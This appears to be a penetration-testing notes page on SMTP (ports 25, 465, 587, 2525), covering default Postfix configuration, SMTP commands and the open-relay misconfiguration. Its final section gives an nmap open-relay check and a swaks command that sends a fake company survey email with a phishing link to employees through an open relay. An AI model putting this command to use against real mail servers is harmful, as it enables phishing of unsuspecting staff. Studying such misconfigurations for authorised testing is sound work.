# SMTP - T25,465,587,2525

### Default Configuration

* `cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"`&#x20;
* **Commands**: AUTH PLAIN, HELO/EHLO, MAIL FROM, RCPT TO, DATA, RSET, VRFY, EXPN, NOOP, QUIT
* List of all SMTP response codes can be found [here](https://serversmtp.com/smtp-error/)

### Dangerous Settings

* To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts.
* Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will allow all IP addresses.
* **Open Relay Configuration -** `mynetworks = 0.0.0.0/0`&#x20;

* #### **OpenRelay Attack**
  * Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.
  * <pre class="language-shellscript" data-line-numbers><code class="lang-shellscript">## Open Relay
    sudo nmap -p 25 --script smtp-open-relay -v &#x3C;ip>
    swaks --from notifications@domain.com --to employees@domain.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server &#x3C;IP>
    </code></pre>
